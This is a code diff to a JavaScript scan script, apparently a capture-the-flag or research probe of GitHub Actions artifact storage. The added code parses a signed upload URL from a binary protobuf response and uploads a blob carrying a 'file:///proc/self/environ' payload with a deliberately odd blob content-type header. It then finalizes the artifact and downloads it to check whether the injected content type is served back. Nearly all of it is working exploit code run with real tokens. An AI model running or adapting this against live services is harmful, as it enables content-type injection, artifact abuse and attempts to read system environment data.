@@ -50,7 +50,40 @@ module.exports = async function scan() {
   ];
   for (const [label, body] of binary) {
     const response = await fetch(url, {method: 'POST', headers: {'Authorization': `Bearer ${runtimeToken}`, 'Content-Type': 'application/protobuf'}, body});
-    const result = await response.arrayBuffer();
+    const result = Buffer.from(await response.arrayBuffer());
     console.log(`${label}: HTTP ${response.status}; type=${response.headers.get('content-type')}; bytes=${result.byteLength}`);
+    if (label === 'binary-nel-then-safe' && response.ok) {
+      function readVarint(bytes, pos) {
+        let value = 0, shift = 0, byte;
+        do { byte = bytes[pos++]; value += (byte & 127) * 2 ** shift; shift += 7; } while (byte & 128);
+        return [value, pos];
+      }
+      let signedUploadUrl = '';
+      for (let pos = 0; pos < result.length;) {
+        let tag; [tag, pos] = readVarint(result, pos);
+        const fieldNo = tag >> 3, wire = tag & 7;
+        if (wire === 0) { [, pos] = readVarint(result, pos); continue; }
+        if (wire !== 2) throw new Error(`Unexpected response wire ${wire}`);
+        let len; [len, pos] = readVarint(result, pos);
+        if (fieldNo === 2) signedUploadUrl = result.subarray(pos, pos + len).toString();
+        pos += len;
+      }
+      if (!signedUploadUrl) throw new Error('No signed upload URL');
+      const blob = Buffer.from('{"full_name":"x/y","owner":{"avatar_url":"file:///proc/self/environ"}}');
+      const put = await fetch(signedUploadUrl, {method: 'PUT', headers: {'Content-Type': 'application/octet-stream', 'x-ms-version': '2025-01-05', 'x-ms-blob-type': 'BlockBlob', 'x-ms-blob-content-type': weird}, body: blob});
+      console.log(`binary-dupe finalize PUT: HTTP ${put.status}`);
+      if (!put.ok) continue;
+      const finalized = await fetch(url.replace('/CreateArtifact', '/FinalizeArtifact'), {method: 'POST', headers: {'Authorization': `Bearer ${runtimeToken}`, 'Content-Type': 'application/json'}, body: JSON.stringify({...ids, name: 'vs-bin-dupe-b', size: String(blob.length)})});
+      const finalResult = await finalized.json();
+      console.log(`binary-dupe Finalize: HTTP ${finalized.status}; ok=${Boolean(finalResult.ok)}`);
+      if (!finalized.ok || !finalResult.ok) continue;
+      const id = String(finalResult.artifact_id || finalResult.artifactId);
+      const download = await fetch(`https://api.github.com/repos/ijuns/repo-cassette-ctf-probe/actions/artifacts/${id}/zip`, {redirect: 'manual', headers: {'Authorization': `Bearer ${process.env.GH_TOKEN}`, 'Accept': 'application/vnd.github.v3+json'}});
+      const location = download.headers.get('location');
+      const rsct = location ? new URL(location).searchParams.get('rsct') : null;
+      let rawType = null;
+      if (location) rawType = (await fetch(location)).headers.get('content-type');
+      console.log(`binary-dupe download: HTTP ${download.status}; rsct=${JSON.stringify(rsct)}; Content-Type=${JSON.stringify(rawType)}`);
+    }
   }
 };
